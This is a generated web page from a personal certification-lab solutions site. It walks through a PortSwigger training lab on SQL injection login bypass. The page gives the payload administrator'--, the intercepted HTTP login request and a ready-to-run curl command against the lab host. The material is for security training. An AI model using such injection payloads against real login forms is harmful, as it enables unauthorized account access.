@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>BSCP certification exercises | Personal solution for all certification labs</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="BSCP certification exercises" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Personal solution for all certification labs" />
+<meta property="og:description" content="Personal solution for all certification labs" />
+<link rel="canonical" href="http://localhost:4000/sql-injection/sql2.html" />
+<meta property="og:url" content="http://localhost:4000/sql-injection/sql2.html" />
+<meta property="og:site_name" content="BSCP certification exercises" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="BSCP certification exercises" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Personal solution for all certification labs","headline":"BSCP certification exercises","url":"http://localhost:4000/sql-injection/sql2.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BSCP certification exercises</h1>
+        </a>
+        <h2>Personal solution for all certification labs</h2>
+
+        <section id="downloads">
+          
+            <a href="" class="btn">Download as .zip</a>
+            <a href="" class="btn">Download as .tar.gz</a>
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="sql-injection">SQL Injection</h2>
+
+<p>This lab contains a SQL injection vulnerability in the login function.</p>
+
+<p>To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.</p>
+
+<h3 id="lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQL injection vulnerability allowing login bypass</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Use Burp Suite to intercept and modify the login request.
+Modify the username parameter, giving it the value: administrator'--
+</code></pre></div></div>
+<p><img src="../assets/images/sql2_solution.png" alt="Solution" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /login HTTP/2
+Host: 0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net
+Cookie: <span class="nv">session</span><span class="o">=</span>V1HfU0aOKM8QTRoRGGK2vGikq9WmbVpJ
+Content-Length: 79
+Cache-Control: max-age<span class="o">=</span>0
+Sec-Ch-Ua: <span class="s2">"Chromium"</span><span class="p">;</span><span class="nv">v</span><span class="o">=</span><span class="s2">"135"</span>, <span class="s2">"Not-A.Brand"</span><span class="p">;</span><span class="nv">v</span><span class="o">=</span><span class="s2">"8"</span>
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: <span class="s2">"Linux"</span>
+Accept-Language: es-ES,es<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
+Origin: https://0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net/login
+Accept-Encoding: <span class="nb">gzip</span>, deflate, br
+Priority: <span class="nv">u</span><span class="o">=</span>0, i
+
+<span class="nv">csrf</span><span class="o">=</span>eDcRT7GQhbS3KUE6dbfOC2G9wJWpPgvK&amp;username<span class="o">=</span>administrator%27--&amp;password<span class="o">=</span>pass
+</code></pre></div></div>
+
+<p>curl command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--path-as-is</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
+    <span class="nt">-H</span> <span class="s1">$'Host: 0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net'</span> <span class="nt">-H</span> <span class="s1">$'Content-Length: 79'</span> <span class="nt">-H</span> <span class="s1">$'Cache-Control: max-age=0'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua: </span><span class="se">\"</span><span class="s1">Chromium</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">135</span><span class="se">\"</span><span class="s1">, </span><span class="se">\"</span><span class="s1">Not-A.Brand</span><span class="se">\"</span><span class="s1">;v=</span><span class="se">\"</span><span class="s1">8</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Mobile: ?0'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Ch-Ua-Platform: </span><span class="se">\"</span><span class="s1">Linux</span><span class="se">\"</span><span class="s1">'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Language: es-ES,es;q=0.9'</span> <span class="nt">-H</span> <span class="s1">$'Origin: https://0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net'</span> <span class="nt">-H</span> <span class="s1">$'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-H</span> <span class="s1">$'Upgrade-Insecure-Requests: 1'</span> <span class="nt">-H</span> <span class="s1">$'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'</span> <span class="nt">-H</span> <span class="s1">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Site: same-origin'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Mode: navigate'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-User: ?1'</span> <span class="nt">-H</span> <span class="s1">$'Sec-Fetch-Dest: document'</span> <span class="nt">-H</span> <span class="s1">$'Referer: https://0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net/login'</span> <span class="nt">-H</span> <span class="s1">$'Accept-Encoding: gzip, deflate, br'</span> <span class="nt">-H</span> <span class="s1">$'Priority: u=0, i'</span> <span class="se">\</span>
+    <span class="nt">-b</span> <span class="s1">$'session=V1HfU0aOKM8QTRoRGGK2vGikq9WmbVpJ'</span> <span class="se">\</span>
+    <span class="nt">--data-binary</span> <span class="s1">$'csrf=eDcRT7GQhbS3KUE6dbfOC2G9wJWpPgvK&amp;username=administrator%27--&amp;password=pass'</span> <span class="se">\</span>
+    <span class="s1">$'https://0a7e00aa0421f3fe8062d07d00dd006b.web-security-academy.net/login'</span>
+</code></pre></div></div>
+
+<hr />
+<p><a href="../index.html">Index</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
